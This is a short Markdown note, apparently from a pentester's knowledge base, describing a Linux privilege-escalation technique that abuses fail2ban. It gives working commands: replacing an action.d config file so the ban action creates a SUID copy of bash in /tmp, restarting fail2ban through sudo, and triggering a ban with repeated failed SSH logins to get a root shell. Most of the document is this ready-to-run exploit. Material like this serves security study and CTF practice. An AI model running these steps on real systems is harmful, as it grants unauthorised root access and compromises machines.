---
tags: [technique, privesc, linux]
---
# fail2ban Abuse

> fail2ban blocks suspicious IPs and runs **action commands as root** while doing so. With write access to the action config + permission to (re)start fail2ban → RCE as root.

## Prerequisites
- Write access in the `action.d` folder (often via a group like `security`):
```bash
ls -la /etc/fail2ban/action.d/
# drwxrwx--- root <group>   <- in <group>? => writing allowed
sudo -l                      # NOPASSWD on fail2ban restart
```

> [!note] Directory vs. file permission
> Folder write access allows renaming/creating/deleting – **not** overwriting the root-owned file directly. => In this case the file can be renamed, then created anew.

## Action file
fail2ban runs the shell commands of these fields as root:

| Field                          | When                        |
| ------------------------------ | --------------------------- |
| `actionban`                    | **on ban** ← attack point   |
| `actionstart/stop/check/unban` | the rest – **leave empty**  |

## Exploit
```bash
cd /etc/fail2ban/action.d/
mv iptables-multiport.conf iptables-multiport.conf.bak
cat > iptables-multiport.conf << 'EOF'
[Definition]
actionstart =
actionstop =
actioncheck =
actionban = cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash
actionunban =
EOF
sudo /etc/init.d/fail2ban restart
```
Provoke a ban (several failed SSH logins):
```bash
for i in $(seq 1 10); do ssh -o StrictHostKeyChecking=no -o PubkeyAuthentication=no bad@<target>; done
```
=> The ban fires `actionban` as root → SUID bash → `/tmp/rootbash -p`.
